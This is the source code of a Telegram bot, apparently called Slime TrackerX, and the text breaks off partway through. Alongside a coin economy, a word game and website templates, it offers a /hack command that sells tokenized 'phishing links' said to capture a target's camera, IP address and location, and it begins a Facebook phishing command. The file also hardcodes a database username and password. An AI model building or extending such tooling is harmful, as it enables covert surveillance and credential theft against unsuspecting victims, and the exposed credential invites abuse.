// =====================================================
// 🎮🔥 SLIME TRACKERX v69.0 - ULTRA DOPE EDITION 🔥🎮
// =====================================================
// 💀 FEATURES: FORCE JOIN | 1H HACK LINKS | WORD BATTLE
// 🗑️ AUTO-DELETE OLD MENUS | 👑 ADMIN WEBSITE VIEWER
// 🎨 DOPE IMAGE | FACEBOOK PHISHING | CAMERA CAPTURE
// 💰 ECONOMY: 15 START | 5 DAILY | 5 WORK
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const multer = require("multer");
const axios = require("axios");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== 🔥 BOT CONFIG ==========
const DOMAIN = "https://metaverify.onrender.com";
const CHANNEL = "@devxtechzone";
const OWNER_ID = 7271063368;
const MENU_IMAGE = "https://i.ibb.co/Txh7V7JL/IMG-3283.jpg";

// ========== 💰 ECONOMY ==========
const WEB_PRICE = 15;
const TRACK_COST = 15;
const NEW_COINS = 15;
const REF_REWARD = 10;
const DAILY_REWARD = 5;
const WORK_REWARD = 5;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;

// ========== 🎮 WORD DIFFICULTY ==========
const difficulties = {
  easy: { name: "🍃 EASY", timer: 45, letters: 3, multiplier: 1, emoji: "🌿", color: "#00FF88" },
  medium: { name: "⚡ MEDIUM", timer: 30, letters: 5, multiplier: 2, emoji: "⚡", color: "#FFD700" },
  hard: { name: "🔥 HARD", timer: 15, letters: 7, multiplier: 3, emoji: "🔥", color: "#FF6B35" },
  expert: { name: "💀 EXPERT", timer: 8, letters: 9, multiplier: 5, emoji: "💀", color: "#FF0066" }
};

// ========== 📚 WORD DATABASE ==========
const wordsByLength = {
  3: ["CAT", "DOG", "SUN", "CAR", "BAG", "HAT", "LEG", "EYE", "CUP", "BED", "RED", "HOT", "BIG", "NEW", "OLD", "FUN", "RUN", "SIT", "EAT", "FLY", "CRY", "JOY", "SAD", "WET", "DRY", "FAT", "RAT", "BAT", "MAT", "PAT", "SAT", "HEN", "PEN", "DEN", "MEN", "TEN", "NET", "PET", "GET", "JET", "SET", "BET", "LET", "MET", "YET", "ZIP", "LIP", "TIP", "HIP", "DIP", "RIP", "SIP", "NIP", "MAP", "CAP", "TAP", "GAP", "LAP", "SAP", "NAP", "VAN", "MAN", "CAN", "PAN", "FAN", "BAN", "RAN", "WAN", "HIT", "KIT", "BIT", "FIT", "PIT", "WIT", "ROW", "COW", "HOW", "NOW", "LOW", "BOW", "TOW", "TOY", "BOY", "DAY", "WAY", "PAY", "SAY", "KEY", "HEY", "ICE", "ACE", "AGE", "ARE", "AND", "END", "INK", "OWL", "EAR", "ARM", "ANT", "WEB", "LAB", "CAB", "JAB", "TUB", "SUB", "RUB", "CUB", "PUB", "HUB"],
  4: ["FISH", "BIRD", "FROG", "STAR", "MOON", "TREE", "WIND", "FIRE", "ROCK", "SAND", "SHIP", "KING", "RING", "SING", "WING", "BOOK", "COOK", "LOOK", "LION", "BEAR", "WOLF", "DEER", "GOAT", "DUCK", "SWAN", "SEAL", "ROAD", "PATH", "WALL", "DOOR", "ROOF", "ROOM", "HALL", "YARD", "GATE", "FARM", "BLUE", "PINK", "GRAY", "GOLD", "SILK", "WOOL", "CASH", "COIN", "NOTE", "BANK", "TIME", "YEAR", "WEEK", "HOUR", "MATH", "CODE", "DATA", "FILE", "FORM", "PLAY", "GAME", "TEAM", "GOAL", "PASS", "KICK", "RACE", "JUMP", "DIVE", "SWIM", "FOOD", "RICE", "MEAT", "CAKE", "SOUP", "EGGS", "SALT", "SPIN", "RAIN", "SNOW", "HEAT", "COLD", "MIST", "FOG", "HAIL", "CLAY", "HAND", "HEAD", "FOOT", "NOSE", "MOUTH", "TEETH", "HAIR", "BELL", "FORK", "SPOON", "KNIFE", "PLATE", "BOWL"],
  5: ["APPLE", "MANGO", "GRAPE", "BERRY", "PEACH", "LEMON", "MELON", "GUAVA", "OLIVE", "HOUSE", "TABLE", "CHAIR", "COUCH", "SHELF", "PLATE", "GLASS", "SPOON", "FORKS", "KNIFE", "HAPPY", "SMART", "BRAVE", "CALM", "KIND", "PROUD", "SHARP", "QUICK", "SWEET", "TOUGH", "LIGHT", "CLEAR", "CLEAN", "DIRTY", "FRESH", "DRIED", "SOFT", "HARD", "BRISK", "SOLID", "WATER", "RIVER", "OCEAN", "LAKES", "BEACH", "SHORE", "WAVES", "TIDES", "DEPTH", "FLOAT", "PLANT", "GRASS", "TREES", "LEAFY", "ROOTS", "BLOOM", "FRUIT", "SEEDS", "GREEN", "GROWN", "MONEY", "VALUE", "PRICE", "COSTS", "SPEND", "SAVES", "LOANS", "TRADE", "STOCK", "BANKS", "POWER", "FORCE", "SPEED", "MOTOR", "DRIVE", "WHEEL", "TRACK", "ROUTE", "PATHS", "WORLD", "EARTH", "SPACE", "STARS", "PLANE", "ROBOT", "DRONE", "ORBIT", "SOLAR", "PEACE", "UNITY", "HUMAN", "HEART", "BRAIN", "MUSIC", "DANCE", "COLOR", "BLACK", "WHITE", "BROWN", "GREEN", "YELLOW", "PURPLE", "ORANGE", "SILVER", "GOLDEN"],
  6: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "HORSE", "CATTLE", "SHEEP", "GOAT", "BUTTER", "CHEESE", "BREAD", "SUGAR", "SALT", "PEPPER", "HONEY", "MILK", "COFFEE", "TEA", "JUICE", "WATER", "DRINK", "SMOOTH", "BITTER", "SWEET", "FLAVOR", "TASTE", "DINNER", "LUNCH", "GARDEN", "PALACE", "CASTLE", "TEMPLE", "CHURCH", "MOSQUE", "SCHOOL", "COLLEGE", "OFFICE", "MARKET", "STREET", "AVENUE", "HIGHWAY", "BRIDGE", "TUNNEL", "STATION", "AIRPORT", "HARBOR", "CENTER", "PLAZA", "PLAYER", "DRIVER", "WRITER", "READER", "SINGER", "DANCER", "ACTOR", "MAKER", "CREATE", "DESIGN", "CODING", "DEBUG", "SYSTEM", "SERVER", "CLIENT", "NETWORK", "SECURE", "ACCESS", "MEMORY", "STORED", "FUTURE", "PAST", "PRESENT", "HISTORY", "SCIENCE", "ART", "MUSIC", "DANCE", "SPORT", "GAME"],
  7: ["ANIMALS", "FARMERS", "HUNTERS", "FISHERS", "DRIVERS", "PLAYERS", "WRITERS", "READERS", "SINGERS", "DANCERS", "TEACHER", "STUDENT", "DOCTORS", "LAWYERS", "BANKERS", "WORKERS", "LEADERS", "MANAGER", "OFFICER", "AGENTS", "FREEDOM", "JUSTICE", "COURAGE", "LOYALTY", "HONESTY", "KINDNESS", "HAPPILY", "SADNESS", "MADNESS", "NETWORK", "SYSTEMS", "PROGRAM", "SERVERS", "CLIENTS", "SECURES", "STORAGE", "PROCESS", "COUNTRY", "VILLAGE", "CITIES", "MARKETS", "SHOPS", "MALLS", "STORES", "HOUSES", "FASHION", "CLOTHES", "SHIRTS", "JACKETS", "SHOES", "WEATHER", "RAINING", "SNOWING", "SUNRISE", "SUNSETS", "STORMS", "THUNDER", "CLIMATE", "SEASONS", "ANCIENT", "MODERNS", "FUTURES", "HISTORY", "BIOLOGY", "PHYSICS", "CHEMIST", "MATHS", "LOGICAL", "NATURAL", "SOCIAL", "CULTURE", "LANGUAGE"],
  8: ["ELEPHANT", "GIRAFFES", "KANGAROO", "DOLPHINS", "PENGUINS", "COMPUTER", "KEYBOARD", "MONITOR", "PRINTER", "SCANNER", "ROUTERS", "NETWORKS", "DATABASE", "SOFTWARE", "HARDWARE", "SECURITY", "FIREWALL", "INTERNET", "BROWSERS", "PROGRAMS", "BEAUTIFUL", "WONDERFUL", "EXCITING", "ADVENTURE", "MYSTERY", "JOURNEY", "DISCOVER", "EXPLORE", "CHALLENGE", "VICTORY", "STRENGTH", "FRIENDS", "HAPPINES", "POWERFUL", "CREATIVE", "THINKING", "LEARNING", "TEACHING", "BUILDING", "PLANNING", "STRATEGY", "BUSINESS", "MARKETING", "FINANCES", "ECONOMY", "INDUSTRY", "PRODUCTS", "SERVICES", "CUSTOMER", "SUPPORTS", "DELIVERY", "LOGISTICS", "MANAGERS", "TEAMWORK", "SUCCESS", "FAILURES", "PROGRESS", "MOTIVATION", "INSPIRATION", "CREATIVITY", "INNOVATION", "TECHNOLOGY", "EDUCATION", "KNOWLEDGE", "WISDOM"],
  9: ["INCREDIBLE", "IMPORTANT", "DIFFERENT", "INTERESTS", "KNOWLEDGE", "EDUCATION", "DEVELOPER", "HAPPINESS", "BEAUTIFUL", "POWERFULL", "CREATIVES", "STRONGEST", "BRIGHTEST", "COMPUTERS", "PROGRAMER", "SOFTWARES", "DATABASES", "NETWORKED", "SECURITYS", "FIREWALLS", "INTERNETS", "MARKETING", "FINANCIAL", "BUSINESSS", "INDUSTRYS", "COMPANIES", "PRODUCTLY", "SERVICESS", "CUSTOMERS", "SUPPORTLY", "DELIVERYS", "LOGISTICS", "MANAGEMENT", "TEAMWORKS", "SUCCESSES", "FAILURES", "PROGRESSES", "STRATEGYS", "OPERATIONS", "PLANNINGS"]
};

// ========== 📁 FILE SETUP ==========
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

fs.ensureDirSync("uploads");
fs.ensureDirSync("exports");
fs.ensureDirSync("public");
fs.ensureDirSync("public/images");

// ========== 🗄️ MONGODB ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected'))
  .catch(err => console.error('❌ MongoDB Error:', err));

// ========== 📊 SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true },
  coins: { type: Number, default: NEW_COINS },
  diamonds: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  hacks: { type: Number, default: 0 },
  facebookHacks: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  isAdmin: { type: Boolean, default: false },
  badges: { type: [String], default: ["🎁 Newbie"] },
  lastActive: { type: Date, default: Date.now }
});

const codeSchema = new mongoose.Schema({
  code: { type: String, unique: true },
  coins: Number,
  diamonds: { type: Number, default: 0 },
  usedBy: [Number],
  maxUses: { type: Number, default: 20 },
  left: Number,
  expire: Date
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  template: String,
  content: Object,
  url: String,
  views: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);

// ========== 💾 CACHE ==========
let usersCache = new Map();
let codesCache = new Map();
let webBuilds = new Map();
let bannedUsers = new Set();
let workCD = new Map();
let wordChallenges = new Map();
let hackTokens = new Map();
let facebookTokens = new Map();
let userLastMessages = new Map(); // For auto-delete

// ========== 📥 DATABASE FUNCTIONS ==========
async function loadData() {
  const users = await User.find({});
  users.forEach(u => usersCache.set(u.userId, u));
  const codes = await Code.find({ expire: { $gt: new Date() } });
  codes.forEach(c => codesCache.set(c.code, c));
  console.log(`📂 Loaded ${usersCache.size} users, ${codesCache.size} codes`);
}

async function saveUser(userId, data) {
  await User.findOneAndUpdate({ userId }, data, { upsert: true });
  usersCache.set(userId, data);
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    user = {
      userId,
      coins: NEW_COINS,
      diamonds: 0,
      referrals: 0,
      referrer: referrerId,
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      wins: 0,
      losses: 0,
      wordWins: 0,
      wordLosses: 0,
      hacks: 0,
      facebookHacks: 0,
      websites: [],
      isAdmin: userId === OWNER_ID,
      badges: ["🎁 Newbie"],
      lastActive: new Date()
    };
    await saveUser(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals++;
        await saveUser(referrerId, referrer);
        bot.telegram.sendMessage(referrerId, `🎉 **NEW REFERRAL!**\n👤 New user joined!\n💰 +${REF_REWARD} COINS`);
      }
    }
  }
  return user;
}

async function addCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level++;
      let reward = user.level * 5;
      user.coins += reward;
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, 
        `🎉 **LEVEL UP!** 🎉\n\n` +
        `📊 ${user.level - 1} → ${user.level}\n` +
        `💰 +${reward} COINS\n` +
        `✨ ${user.xp}/${user.level * 100} XP`
      );
    } else {
      await saveUser(userId, user);
    }
  }
}

async function getUsername(userId) {
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'SlimeTrackerXBot'}?start=ref_${id}`;
}

// ========== 🗑️ AUTO-DELETE OLD MESSAGES ==========
async function deleteOldMessage(chatId, messageId) {
  try {
    if (messageId) {
      await bot.telegram.deleteMessage(chatId, messageId);
    }
  } catch (e) {
    // Message already deleted or too old
  }
}

async function sendDopeMessage(ctx, text, extra = {}) {
  // Try to delete previous message
  const lastMsg = userLastMessages.get(ctx.from.id);
  if (lastMsg) {
    await deleteOldMessage(ctx.chat.id, lastMsg);
  }
  
  // Send new message
  let sentMsg;
  if (extra.photo) {
    sentMsg = await ctx.replyWithPhoto(extra.photo, { caption: text, parse_mode: "Markdown", ...extra });
  } else {
    sentMsg = await ctx.reply(text, { parse_mode: "Markdown", ...extra });
  }
  
  // Store new message ID
  userLastMessages.set(ctx.from.id, sentMsg.message_id);
  
  return sentMsg;
}

// ========== 🔐 FORCE JOIN FUNCTION ==========
async function checkJoin(userId) {
  try {
    const chatMember = await bot.telegram.getChatMember(CHANNEL, userId);
    const allowed = ["creator", "administrator", "member", "restricted"];
    return allowed.includes(chatMember.status);
  } catch (error) {
    return false;
  }
}

// ========== 🎫 REDEEM CODE ==========
async function genCode(coins, diamonds = 0, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  
  let codeData = new Code({
    code, coins, diamonds,
    usedBy: [],
    maxUses: uses,
    left: uses,
    expire
  });
  
  await codeData.save();
  codesCache.set(code, codeData);
  return code;
}

async function redeemCode(userId, code) {
  let c = codesCache.get(code.toUpperCase());
  if (!c) return { ok: false, msg: "❌ Invalid code!" };
  if (Date.now() > c.expire) return { ok: false, msg: "❌ Code expired!" };
  if (c.left <= 0) return { ok: false, msg: "❌ Code used up!" };
  if (c.usedBy.includes(userId)) return { ok: false, msg: "❌ Already used!" };
  
  await addCoin(userId, c.coins);
  if (c.diamonds > 0) {
    let user = usersCache.get(userId);
    user.diamonds += c.diamonds;
    await saveUser(userId, user);
  }
  
  c.usedBy.push(userId);
  c.left--;
  await c.save();
  codesCache.set(c.code, c);
  
  return { ok: true, msg: `✅ **REDEEMED!**\n💰 +${c.coins} COINS${c.diamonds > 0 ? `\n💎 +${c.diamonds} DIAMONDS` : ''}` };
}

// ========== 🎨 DOPE HTML TEMPLATES ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.name || 'Portfolio'} | SlimeTrackerX</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; flex-wrap: wrap; gap: 20px; }
        .logo { font-size: 28px; font-weight: 800; background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .nav-links { display: flex; gap: 30px; }
        .nav-links a { color: #fff; text-decoration: none; transition: 0.3s; }
        .nav-links a:hover { color: #4ECDC4; }
        .hero { text-align: center; padding: 80px 0; }
        .hero h1 { font-size: 56px; margin-bottom: 20px; background: linear-gradient(45deg, #FF6B6B, #4ECDC4, #45B7D1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero p { font-size: 20px; opacity: 0.9; margin-bottom: 30px; }
        .btn { display: inline-block; background: linear-gradient(45deg, #FF6B6B, #4ECDC4); color: white; padding: 12px 30px; border-radius: 30px; text-decoration: none; font-weight: 600; transition: 0.3s; }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
        .section { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 40px; margin: 40px 0; backdrop-filter: blur(10px); }
        .section h2 { margin-bottom: 20px; font-size: 32px; }
        .skills { display: flex; gap: 15px; flex-wrap: wrap; margin-top: 20px; }
        .skill { background: rgba(255,255,255,0.1); padding: 10px 20px; border-radius: 20px; }
        .projects { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; margin-top: 30px; }
        .project-card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 20px; transition: 0.3s; }
        .project-card:hover { transform: translateY(-5px); border: 1px solid rgba(78,205,196,0.3); }
        footer { text-align: center; padding: 40px; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 60px; }
        .social-links { display: flex; justify-content: center; gap: 20px; margin-top: 20px; }
        .social-links a { color: white; font-size: 24px; transition: 0.3s; }
        .social-links a:hover { color: #4ECDC4; transform: translateY(-3px); }
        @media (max-width: 768px) { .navbar { flex-direction: column; text-align: center; } .hero h1 { font-size: 32px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="navbar">
            <div class="logo"><i class="fas fa-code"></i> ${data.name || 'Portfolio'}</div>
            <div class="nav-links"><a href="#">Home</a><a href="#">About</a><a href="#">Projects</a><a href="#">Contact</a></div>
        </div>
        <div class="hero"><h1>${data.name || 'Welcome'}</h1><p>${data.title || 'Creative Developer'}</p><a href="#" class="btn">Hire Me</a></div>
        <div class="section"><h2>About Me</h2><p>${data.bio || 'Passionate creator building amazing web experiences.'}</p><div class="skills"><span class="skill">${data.skill1 || 'JavaScript'}</span><span class="skill">${data.skill2 || 'React'}</span><span class="skill">${data.skill3 || 'Node.js'}</span></div></div>
        <footer><p>Built with SlimeTrackerX</p></footer>
    </div>
</body>
</html>`,
  
  business: (data) => `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.company || 'Business'} | SlimeTrackerX</title><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Poppins',sans-serif;background:#0a0a0a;color:#fff;}.navbar{background:rgba(10,10,10,0.95);padding:20px 40px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:20px;}.logo{font-size:28px;font-weight:800;background:linear-gradient(45deg,#FFD700,#FF6347);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.hero{background:linear-gradient(135deg,#1a1a2e,#16213e);text-align:center;padding:120px 20px;}.hero h1{font-size:56px;margin-bottom:20px;}.btn{background:linear-gradient(45deg,#FFD700,#FF6347);color:#1a1a2e;padding:15px 40px;border-radius:40px;text-decoration:none;font-weight:600;display:inline-block;}.container{max-width:1200px;margin:0 auto;padding:80px 20px;}.services{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;}.service-card{background:rgba(255,255,255,0.05);border-radius:20px;padding:40px 30px;text-align:center;}.service-card i{font-size:50px;color:#FFD700;margin-bottom:20px;}footer{text-align:center;padding:40px;margin-top:60px;}</style></head>
<body><div class="navbar"><div class="logo">${data.company || 'Business'}</div></div><div class="hero"><h1>${data.company || 'Welcome'}</h1><p>${data.tagline || 'Excellence Since 2024'}</p><a href="#" class="btn">Get Started</a></div><div class="container"><div class="services"><div class="service-card"><i class="fas fa-rocket"></i><h3>${data.service1 || 'Innovation'}</h3><p>${data.service1_desc || 'Cutting-edge solutions'}</p></div><div class="service-card"><i class="fas fa-chart-line"></i><h3>${data.service2 || 'Growth'}</h3><p>${data.service2_desc || 'Strategic planning'}</p></div><div class="service-card"><i class="fas fa-headset"></i><h3>${data.service3 || 'Support'}</h3><p>${data.service3_desc || '24/7 support'}</p></div></div></div><footer><p>Built with SlimeTrackerX</p></footer></body></html>`,
  
  store: (data) => `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.store || 'Store'} | SlimeTrackerX</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Inter',sans-serif;background:#f8f9fa;}.navbar{background:white;padding:20px 40px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:20px;box-shadow:0 2px 20px rgba(0,0,0,0.1);}.logo{font-size:28px;font-weight:800;background:linear-gradient(45deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.hero{background:linear-gradient(135deg,#667eea,#764ba2);color:white;text-align:center;padding:80px 20px;}.hero h1{font-size:48px;}.products{max-width:1200px;margin:60px auto;padding:0 20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;}.product-card{background:white;border-radius:20px;overflow:hidden;box-shadow:0 5px 20px rgba(0,0,0,0.1);padding:20px;text-align:center;}.product-card i{font-size:60px;color:#667eea;margin-bottom:20px;}.product-price{font-size:24px;font-weight:800;color:#667eea;margin:10px 0;}footer{background:#1a1a2e;color:white;text-align:center;padding:40px;margin-top:60px;}</style></head>
<body><div class="navbar"><div class="logo">${data.store || 'Store'}</div></div><div class="hero"><h1>${data.store || 'Welcome'}</h1><p>${data.tagline || 'Best Prices'}</p></div><div class="products"><div class="product-card"><i class="fas fa-laptop-code"></i><h3>${data.product1 || 'Product 1'}</h3><div class="product-price">$${data.product1_price || '49'}</div><button style="background:#667eea;color:white;border:none;padding:10px 20px;border-radius:10px;cursor:pointer;">Buy Now</button></div><div class="product-card"><i class="fas fa-mobile-alt"></i><h3>${data.product2 || 'Product 2'}</h3><div class="product-price">$${data.product2_price || '79'}</div><button style="background:#667eea;color:white;border:none;padding:10px 20px;border-radius:10px;cursor:pointer;">Buy Now</button></div><div class="product-card"><i class="fas fa-crown"></i><h3>${data.product3 || 'Product 3'}</h3><div class="product-price">$${data.product3_price || '99'}</div><button style="background:#667eea;color:white;border:none;padding:10px 20px;border-radius:10px;cursor:pointer;">Buy Now</button></div></div><footer><p>Built with SlimeTrackerX</p></footer></body></html>`
};

// ========== 🎛️ DOPE MAIN MENU ==========
function getMainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "💀 HACK", callback_data: "menu_hack" }, { text: "📘 FB HACK", callback_data: "menu_fbhack" }],
        [{ text: "📝 WORD BATTLE", callback_data: "menu_word" }, { text: "🌐 CREATE WEBSITE", callback_data: "menu_web" }],
        [{ text: "🎰 CASINO", callback_data: "menu_casino" }, { text: "🎮 GAMES", callback_data: "menu_games" }],
        [{ text: "💰 ECONOMY", callback_data: "menu_eco" }, { text: "🏆 LEADERBOARD", callback_data: "menu_leaderboard" }],
        [{ text: "👤 PROFILE", callback_data: "menu_profile" }, { text: "🛒 SHOP", callback_data: "menu_shop" }],
        [{ text: "🎁 REDEEM", callback_data: "menu_redeem" }, { text: "🔗 REFERRAL", callback_data: "menu_ref" }],
        [{ text: "📢 CHANNEL", url: "https://t.me/devxtechzone" }, { text: "👑 ADMIN", callback_data: "menu_admin" }]
      ]
    }
  };
}

// ========== 🛡️ MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 **YOU ARE BANNED!**");
  
  let user = usersCache.get(ctx.from.id);
  if (user) { 
    user.lastActive = new Date(); 
    await saveUser(ctx.from.id, user); 
  }
  
  if (ctx.from.id === OWNER_ID) return next();
  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") return next();
  
  const isMember = await checkJoin(ctx.from.id);
  if (!isMember) {
    if (ctx.callbackQuery) return ctx.answerCbQuery("❌ JOIN CHANNEL FIRST!", true);
    return ctx.reply(`🚫 **JOIN ${CHANNEL} FIRST!**`, {
      reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }, { text: "✅ I JOINED", callback_data: "check_join" }]] }
    });
  }
  return next();
});

// ========== ✅ CHECK JOIN BUTTON ==========
bot.action("check_join", async (ctx) => {
  const isMember = await checkJoin(ctx.from.id);
  if (isMember) {
    await ctx.answerCbQuery("✅ VERIFIED!");
    let user = await initUser(ctx.from.id);
    await sendDopeMessage(ctx, 
      `🔥 **SLIME TRACKERX v69.0** 🔥\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} COINS | 💎 ${user.diamonds}\n📊 LEVEL ${user.level} | 👥 ${user.referrals} REFFS\n🏆 WORD WINS: ${user.wordWins}\n💀 HACKS: ${user.hacks}\n📘 FB HACKS: ${user.facebookHacks || 0}\n\n⬇️ **CHOOSE YOUR PATH** ⬇️`,
      { photo: MENU_IMAGE, ...getMainMenu() }
    );
  } else {
    await ctx.answerCbQuery("❌ Not a member!");
  }
});

// ========== 🚀 START COMMAND ==========
bot.start(async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    const isMember = await checkJoin(ctx.from.id);
    if (!isMember) {
      return ctx.reply(`🚫 **JOIN ${CHANNEL} FIRST!**`, {
        reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }, { text: "✅ I JOINED", callback_data: "check_join" }]] }
      });
    }
  }

  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) ref = parseInt(args[1].replace("ref_", ""));
  let user = await initUser(ctx.from.id, ref);
  
  await sendDopeMessage(ctx,
    `🎮 **SLIME TRACKERX v69.0** 🎮\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} COINS | 💎 ${user.diamonds}\n📊 LEVEL ${user.level} | 👥 ${user.referrals} REFFS\n🏆 WORD WINS: ${user.wordWins}\n💀 HACKS: ${user.hacks}\n📘 FB HACKS: ${user.facebookHacks || 0}\n\n⬇️ **TAP THE BUTTONS** ⬇️`,
    { photo: MENU_IMAGE, ...getMainMenu() }
  );
});

// ========== 💀 HACK COMMAND (Generic) ==========
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) {
    await sendDopeMessage(ctx,
      `💀 **PHISHING LINK GENERATOR** 💀\n\n📌 Usage: /hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures: Camera + IP + Location\n⏰ Expires in 1 HOUR!\n\n📝 Example: /hack free gift`
    );
    return;
  }
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) {
    return sendDopeMessage(ctx, `❌ Need ${TRACK_COST} coins! You have ${user.coins}`);
  }
  
  await takeCoin(ctx.from.id, TRACK_COST);
  user.hacks = (user.hacks || 0) + 1;
  await saveUser(ctx.from.id, user);
  
  let token = crypto.randomBytes(16).toString("hex");
  let label = args.slice(1).join(" ");
  let expiresAt = Date.now() + (60 * 60 * 1000);
  
  hackTokens.set(token, { userId: ctx.from.id, username: ctx.from.username, label, expiresAt });
  setTimeout(() => hackTokens.delete(token), 60 * 60 * 1000);
  
  let hackLink = `${DOMAIN}/?token=${token}`;
  
  await sendDopeMessage(ctx,
    `💀 **PHISHING LINK READY** 💀\n\n🎯 Label: ${label}\n💰 Cost: -${TRACK_COST} COINS\n💀 Total Hacks: ${user.hacks}\n⏰ Expires in 1 HOUR\n\n🔗 \`${hackLink}\`\n\n⚠️ Send this to your target!`
  );
});

// ========== 📘 FACEBOOK HACK COMMAND ==========
bot.command("fbhack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) {
    await sendDopeMessage(ctx,
